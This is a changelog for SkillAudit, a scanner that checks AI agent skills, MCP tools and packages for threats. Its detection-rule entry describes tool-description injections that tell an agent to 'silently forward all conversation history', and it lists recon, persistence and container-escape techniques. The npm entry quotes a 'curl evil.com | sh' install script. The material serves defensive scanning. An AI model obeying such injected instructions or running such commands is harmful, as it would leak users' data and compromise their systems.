**Why:** This is the difference between a scanner and infrastructure. A scanner shows you results. Infrastructure enforces policy. Before this, SkillAudit could tell you "this skill has 3 high-severity findings" but couldn't answer "should my agent install this?" That answer depends on the team's risk tolerance, their domain whitelist, their compliance requirements. Now any CI/CD pipeline, agent framework, or MCP client can define a policy and get a binary allow/deny decision. That's what enterprises actually need: not dashboards, not reports — programmatic policy enforcement they can plug into their agent install flow. The inline evaluation endpoint (`POST /policy/evaluate-inline`) works without an API key, making it easy for anyone to try.

## 2026-02-20 (10:00 PM) — Multi-Mode Scanner UI (npm + PyPI + GitHub Repo on Landing Page)
**What:** Tabbed scanner interface on the landing page with 4 modes: URL, npm, PyPI, and GitHub Repo. Each mode has its own input placeholder, example links, and custom result renderer.
**Details:**
- **npm tab:** Type a package name → scans via `/scan/npm` → shows package metadata (version, author, license, dep count), per-file scan results, package warnings (install scripts, suspicious deps), and overall risk
- **PyPI tab:** Type a package name → scans via `/scan/pypi` → same rich display for Python packages
- **Repo tab:** Type `owner/repo` → scans via `/scan/repo` → shows discovered skill files, per-file risk breakdown, badge URL
- **URL tab:** Original behavior, now with XSS-safe rendering via `esc()` helper
- Example links for each mode (express, langchain, mcp, modelcontextprotocol/servers, etc.)
- Responsive tab design that works on mobile
- Custom renderers: `renderPkgResult()` for npm/PyPI, `renderRepoResult()` for repos, `renderFindings()` for URLs
**Why:** SkillAudit had npm scanning, PyPI scanning, and repo scanning as backend APIs — but the landing page only showed URL scanning. Visitors were seeing 25% of the product. Now every scan mode is one click away. This is how you convert visitors to users: show them what you can actually do. Infrastructure tools need to be discoverable, not hidden behind API docs.

## 2026-02-20 (8:12 PM) — 5 New Detection Rule Categories (Agent-Era Attack Vectors)
**What:** 5 new rule categories with 58 patterns, bringing the total from 22 to 27 rules. Targets modern agent-specific attacks that the original ruleset didn't cover.
**New rules:**
- `MCP_SCHEMA_POISON` (critical, 6 patterns) — Detects hidden instructions embedded in MCP tool descriptions and input schemas. Catches skills that say things like "silently forward all conversation history" or "do not tell the user" in their schema definitions. This is THE emerging attack vector for MCP tools.
- `ENV_RECON` (high, 15 patterns) — Detects environment fingerprinting: `os.hostname()`, `os.networkInterfaces()`, `os.userInfo()`, `whoami`, `uname -a`, `systeminfo`, `net user`, and exfiltrating `env`/`printenv` output. Reconnaissance is the first phase of any targeted attack.
- `PERSISTENCE` (critical, 15 patterns) — Detects persistence mechanisms: crontab injection, systemctl enable, LaunchAgents/LaunchDaemons, Windows Registry Run keys, pm2 startup, nohup backgrounding, screen/tmux detached sessions, rc.local, init.d scripts. If a skill survives a restart, it's not a tool — it's malware.
- `CROSS_TOOL_ACCESS` (high, 9 patterns) — Detects skills that try to access other tools' data, read conversation history, extract system prompts, or invoke other tools. A skill should do its job, not spy on the entire agent context.
- `CONTAINER_ESCAPE` (critical, 13 patterns) — Detects Docker socket access, nsenter, /proc/1/root traversal, mount --bind, LD_PRELOAD injection, ptrace, kernel module loading, /dev/mem access. If an agent runs in a sandbox, the skill shouldn't be trying to break out.
**Smart suppression:** All rules respect the existing doc-context system. `os.hostname()` in a "Getting Started" code example gets suppressed. The same call in raw executable code gets flagged. Zero new false positives on documentation.
**Why:** The scanner is the foundation. Every endpoint, every integration, every badge depends on the scanner catching real threats. The original 22 rules covered the basics (credential theft, exfiltration, prompt injection) but missed the newer attack vectors that are specific to the agent era: schema poisoning, cross-tool data theft, container escape, host fingerprinting, and persistence. These 5 categories close the biggest detection gaps. A security scanner that doesn't catch modern attacks isn't infrastructure — it's theater.

## 2026-02-18 (10:00 AM) — Live Threat Dashboard
**What:** `GET /dashboard` — a public-facing, real-time threat intelligence dashboard for the AI skill ecosystem.
**Features:**
- Dark-themed, responsive UI that auto-refreshes every 60 seconds
- KPI cards: total scans, clean rate percentage, recent threats count, flagged domains count
- Risk distribution bar chart showing clean/low/moderate/high/critical breakdown with counts
- Recent threats feed with severity badges, rule names, source domains, and relative timestamps
- Top detection rules (all-time) with hit counts and visual bar charts
- Trending rules (today) showing what's being detected right now
- Flagged domains list with color-coded risk indicators
- Fully client-side — fetches from `/stats`, `/feed`, `/feed/domains`, `/feed/rules` APIs
- Mobile-friendly responsive grid layout
- Added link from landing page footer
**Why:** SkillAudit had powerful APIs but no public face for the threat data. Security platforms need dashboards — it's how you build credibility, get shared on social media, and show the ecosystem you're real. Think GitHub's security advisories page or VirusTotal's stats. This makes SkillAudit *visible*. When someone asks "what threats are out there in the MCP ecosystem?" the answer is now a URL: `skillaudit.vercel.app/dashboard`. That's how you become infrastructure people talk about.

## 2026-02-18 (7:00 AM) — Dependency Tree Scanner (Supply Chain Security)
**What:** `POST /scan/deps` — paste your package.json, get a full supply chain risk report for ALL your dependencies.
**How it works:**
- Accepts a full `packageJson` object or a `dependencies` map
- Scans up to 50 dependencies via npm registry metadata
- Detects dangerous install scripts (preinstall/postinstall with curl/eval/exec/etc.)
- Flags deprecated packages
- Scans each package.json for SkillAudit detection patterns
- Returns aggregate risk: overall risk level, risk breakdown, flagged deps, install script warnings
- Highlights the specific dangerous dependencies so you know exactly what to audit
**Example:**
```bash
curl -X POST https://skillaudit.vercel.app/scan/deps \
  -H 'Content-Type: application/json' \
  -d '{"packageJson": {"name": "my-agent", "dependencies": {"express": "^4.0.0", "@modelcontextprotocol/sdk": "^1.0.0"}}}'
```
**Why:** This is `npm audit` for AI agent projects. Before this, you could scan individual packages one at a time. Now you can dump your entire package.json and get a supply chain risk report in one call. CI/CD pipelines can POST their package.json before deploy and block if any dependency is flagged. This is how real supply chain security works — you don't scan one package, you scan the entire tree. Combined with the GitHub Action, teams can now block deploys that introduce risky dependencies automatically.

## 2026-02-18 (1:00 AM) — NPM Package Scanner
**What:** `GET /scan/npm?package=@scope/name` — scan any npm package by name. Also available as `skillaudit_npm` MCP tool.
**How it works:**
- Fetches latest version metadata from npm registry
- Pulls README.md, package.json, main entry point, bin scripts, and skill files (SKILL.md, mcp.json) from unpkg CDN
- Scans ALL fetched files with the full SkillAudit engine
- Detects suspicious install scripts (preinstall/postinstall with curl/wget/eval/exec)
- Returns combined risk assessment across all files
- Works with scoped (@org/pkg) and unscoped packages
**Why:** MCP tools are distributed as npm packages. Before this, you had to know the exact URL of a skill file to scan it. Now agents (and humans) can just pass a package name: `/scan/npm?package=@modelcontextprotocol/server-filesystem`. That's how security scanners work in the real world — `npm audit` scans by package name, not by URL. This makes SkillAudit match how tools are actually distributed in the MCP ecosystem. Plus, the install script detection catches supply chain attacks that file-level scanning misses — a clean README means nothing if `postinstall` runs `curl evil.com | sh`.

## 2026-02-17 (10:00 PM) — MCP Server (Model Context Protocol Native Integration)
**What:** SkillAudit is now an MCP server. Any MCP-compatible agent can use SkillAudit as a native tool — no HTTP, no API keys, just `npx skillaudit --mcp`.
**Tools exposed:**
- `skillaudit_gate` — Pre-install allow/warn/deny decision (the infrastructure endpoint, now native)
- `skillaudit_scan` — Full scan by URL with detailed findings
- `skillaudit_scan_content` — Scan raw content directly (local files, generated code)
- `skillaudit_reputation` — Domain reputation lookup from historical scan data
- `skillaudit_batch` — Scan up to 10 URLs at once with risk summary
**Technical:**
- Full MCP protocol: JSON-RPC 2.0 over stdio, Content-Length framing, protocol version 2024-11-05
- Runs the local scanning engine — zero API calls needed for scan/gate operations
- Reputation falls back to hosted API (skillaudit.vercel.app)
- Works with Claude Desktop, Cursor, Windsurf, OpenClaw, and any MCP client
**Config example (Claude Desktop):**
```json
{ "mcpServers": { "skillaudit": { "command": "npx", "args": ["skillaudit", "--mcp"] } } }
```
**Why:** This is THE infrastructure play. Before this, agents had to know about SkillAudit's HTTP API, construct URLs, parse responses. Now it's a native tool that shows up in their tool list automatically. An agent sees `skillaudit_gate` as a built-in capability, just like file reading or web browsing. The MCP ecosystem is where agents discover tools — and now SkillAudit is there. Every MCP-compatible agent can call `skillaudit_gate` before installing anything, with zero setup beyond adding one config line. That's how you become infrastructure — not a service agents call, but a capability they have.

## 2026-02-17 (7:00 AM) — SARIF v2.1.0 Output (Industry-Standard Security Format)
**What:** Full SARIF (Static Analysis Results Interchange Format) v2.1.0 support — the universal language for security scanners.
**Endpoints:**
- `GET /scan/:id/sarif` — Get any existing scan result in SARIF format
- `GET /scan/quick?url=...&format=sarif` — Scan and return SARIF directly
- `POST /scan/url` with `format: "sarif"` — Same for POST scans
- `POST /scan/content` with `format: "sarif"` — Same for content scans
**SARIF features:**
- Full v2.1.0 compliance: `$schema`, versioned runs, typed rules, located results
- Security-severity scores (CVSS-like 0-10 scale) on every rule — GitHub Code Scanning uses this for prioritization
- Suppression tracking: documentation-context findings marked with `suppressions[].kind: "inSource"`
- Content hashes (SHA-256) in artifacts for tamper detection
- Threat chain metadata preserved in result properties
- Invocation properties include SkillAudit-specific data (riskLevel, riskScore, verdict, reportUrl)
**Why:** SARIF is THE standard. GitHub Code Scanning consumes it natively (upload via `github/codeql-action/upload-sarif`), VS Code has a SARIF Viewer extension, Azure DevOps pipelines understand it, and every security aggregation platform speaks it. Before this, SkillAudit results were locked in our own format — now they plug into the entire security tooling ecosystem. This means: (1) GitHub repos can show SkillAudit findings in the Security tab alongside CodeQL, (2) VS Code can display findings inline, (3) security dashboards can aggregate SkillAudit with other scanners. That's interoperability. That's infrastructure.

## 2026-02-17 (1:00 AM) — Signed Audit Certificates
**What:** Cryptographically signed certificates that prove a skill was audited by SkillAudit.
**Endpoints:**
- `GET /certificate/:scanId` — Returns a signed certificate with HMAC-SHA256 signature, content hash, risk assessment, and a compact base64url token
- `GET /certificate/verify?token=<token>` — Verifies a certificate token. Browsers get a styled HTML verification page; APIs get JSON `{valid: true/false}`
**Certificate includes:**
- SHA-256 hash of the scanned content (tamper detection — if content changed, the hash won't match)
- Risk level, score, findings count, critical count, verdict
- Issue date + 30-day expiry
- Issuer attribution (`skillaudit.vercel.app`)
- HMAC-SHA256 signature (unforgeable without server secret)
- Compact token for embedding in READMEs: `[![SkillAudit](badge-url)](verify-url)`
**Why:** This is the "SSL certificate" play. Before this, SkillAudit could tell you a skill was safe *right now*, but there was no portable, verifiable proof. Now registries can require "show me a SkillAudit certificate" before listing a skill. Agent frameworks can verify certificates programmatically. Skill authors can embed clickable verification badges in their READMEs. The content hash means if someone modifies the skill after certification, the hash mismatch is detectable. This creates a **trust chain** — SkillAudit issues certificates, registries verify them, users trust the ecosystem. That's infrastructure.

## 2026-02-16 (4:00 PM) — Pre-Install Gate API
**What:** `GET /gate?url=<skill_url>` — the infrastructure endpoint. One call, one answer: "should I install this?"
**Response:** `{allow: true/false, decision: "allow"|"warn"|"deny", risk, score, findings, verdict, domainReputation, topFindings}`
**Features:**
- Configurable `threshold` param (low/moderate/high/critical, default: moderate) — deny at or above this level
- Three-state decision: `allow` (clean), `warn` (below threshold but has findings), `deny` (at/above threshold)
- Includes domain reputation from scan history when available
- Top 3 findings summary (severity + name + rule) for quick context
- Minimal JSON — no full findings array, no capabilities, just the decision
- Updated AI plugin manifest to lead with gate endpoint
- Updated OpenAPI spec with full parameter docs
**Why:** This is THE infrastructure endpoint. Every agent framework can add one line: "before installing, `GET /gate?url=X` — if `allow` is false, abort." It's the TSA PreCheck of AI skills. Dead simple, fast, programmatic. The full scan endpoints are for humans who want details — the gate is for agents who just need a yes or no. This is how SkillAudit becomes the security layer that's already there.

## 2026-02-16 (10:00 AM) — Threat Intelligence Feed API
**What:** Five new endpoints that turn SkillAudit into a real-time threat intelligence source for the AI skill ecosystem.
**Endpoints:**
- `GET /feed` — Main feed: recent threats, flagged domains, trending detection rules, severity breakdown, subscription options
- `GET /feed/threats` — Paginated threat events with optional severity filter (critical/high/medium/low)
- `GET /feed/since?ts=<unix_ms>` — Incremental updates since a timestamp (for polling consumers)
- `GET /feed/domains` — Recently flagged domains (moderate+ risk only)
- `GET /feed/rules` — Most triggered detection rules, all-time and today (trend detection)
**How it works:**
- Every scan now emits threat events to Redis for each actionable finding (up to 10 per scan)
- Threat events stored in both a list (last 500) and a sorted set (for timestamp range queries)
- Rule hits tracked globally + daily buckets with 7-day TTL for trend analysis
- Domains flagged at moderate+ risk tracked in a sorted set by timestamp
- Zero overhead on existing endpoints — all tracking is fire-and-forget
**Why:** Before this, SkillAudit was a tool you queried — scan a URL, get a result, done. Now it's a **threat intelligence platform**. Security tools, agent frameworks, and other scanners can consume the feed to know what threats are active in the AI skill ecosystem RIGHT NOW. This is how SkillAudit becomes infrastructure — not just a scanner you use, but a data source others build on. Think VirusTotal's threat feed but for AI agent skills.

## 2026-02-16 (1:00 AM) — Domain Reputation API
**What:** Two new endpoints that turn SkillAudit into a persistent reputation database for skill domains.
**Endpoints:**
- `GET /reputation/:domain` — Returns aggregated reputation for any domain: trust level (trusted/moderate/suspicious/dangerous), reputation score (0-100), total scan count, risk distribution across all scans, average risk score, first/last scan dates
- `POST /reputation/bulk` — Check up to 50 domains in one request with summary stats
**How it works:**
- Every scan now tracks domain-level stats in Redis (scan count, risk level counts, cumulative score)
- Reputation score is weighted: clean scans build trust (+2), critical scans damage it (-20) — like a credit score
- Domain data is permanent (no TTL) — reputation builds over time
- Unknown domains return `reputation: "unknown"` with a link to scan them
**Why:** This is the "reputation database" play. Before this, SkillAudit was a one-shot scanner — you scan, you get a result, done. Now it accumulates knowledge. Agents can ask "is this domain trustworthy?" without even scanning — just check the reputation. This is how antivirus databases work: the more scans happen, the smarter the system gets. SkillAudit stops being a tool and starts being a knowledge base.

## 2026-02-15 (10:00 PM) — Persistent Scan Results (Redis-backed)
**What:** All scan results now persist in Redis with 30-day TTL. Report links (`/report/:id`), JSON endpoints (`/scan/:id`), capability breakdowns (`/capabilities/:id`), and Moltbook sharing all survive Vercel cold starts.
**How it works:**
- Every scan stores full results in Redis under `scan:<id>` with 30-day expiry
- All lookup endpoints use a new `getScanResult()` helper: checks in-memory first, falls back to Redis
- Redis results auto-repopulate the memory cache on access (fast subsequent lookups)
- Zero breaking changes — existing endpoints work exactly the same
**Why:** This was THE biggest reliability gap. Before this, every shared report link broke when Vercel's serverless function cold-started (which happens constantly on the free tier). If someone scanned a skill and shared the report URL, it would 404 within minutes. Now reports last 30 days. This is essential for infrastructure — you can't be a trust layer if your evidence disappears. Badge checks, CI reports, Moltbook shares — they all depend on persistent results.

## 2026-02-15 (3:00 PM) — GitHub Action for CI/CD Security Scanning
**What:** A complete GitHub Action (`megamind-0x/skillaudit/action@main`) that auto-scans skill files on every PR.
**How it works:**
- Composite action installs SkillAudit via npm, runs local scan on the repo
- Posts detailed PR comments with findings table (severity, rule, description, line number)
- Configurable risk threshold — fails the build if risk exceeds `fail-on` level (default: high)
- Outputs `risk-level`, `risk-score`, `findings-count` for downstream workflow steps
- Example workflow included at `.github/workflows/skillaudit.yml`
**Why:** This is THE infrastructure play. If repos add SkillAudit to their CI, it runs automatically on every change — like linting or tests. SkillAudit stops being a tool you go to and becomes a gate you pass through. Every PR that touches skill files gets scanned before merge. This is how SkillAudit becomes the default security layer.

## 2026-02-15 (10:00 AM) — Hardcoded Secret Detection Engine
**What:** 22 dedicated detectors for real API keys, tokens, and credentials embedded in skill files. New `/secrets/detectors` endpoint.
**Detects:** OpenAI, Anthropic, GitHub, AWS, Slack, Discord, Stripe, SendGrid, Google, Telegram, Mailgun, Vercel, npm, PyPI keys/tokens, PEM private keys, and generic high-entropy secret assignments.
**Smart features:** Shannon entropy validation, automatic placeholder suppression (won't flag `YOUR_KEY` or examples), secret redaction in output (only shows first 6 + last 2 chars), context-aware matching.
**Why:** This is the single biggest gap in the scanner. Existing rules caught env file access and token stealing *intent*, but couldn't detect actual leaked credentials sitting in skill files. Hardcoded secrets are the #1 real-world vulnerability in code — now SkillAudit catches them. This is what makes us a real security tool, not just a pattern matcher.

## 2026-02-15 — SVG Badge API
**What:** Embeddable SVG badge endpoints for READMEs and skill registries.
**Endpoints:**
- `GET /badge/:domain.svg` — returns shields.io-style SVG badge showing a domain's audit status (clean/low/moderate/high/critical/unaudited)
- `GET /badge/scan.svg?url=...` — live scan + SVG badge in one request (scan a skill, get a badge image back)
**Why:** Infrastructure play. If every skill README has a SkillAudit badge, we become visible everywhere skills are published — like build status badges for CI. This makes SkillAudit the default trust signal for agent skills.
**Usage:** `![SkillAudit](https://skillaudit.vercel.app/badge/scan.svg?url=https://example.com/SKILL.md)`
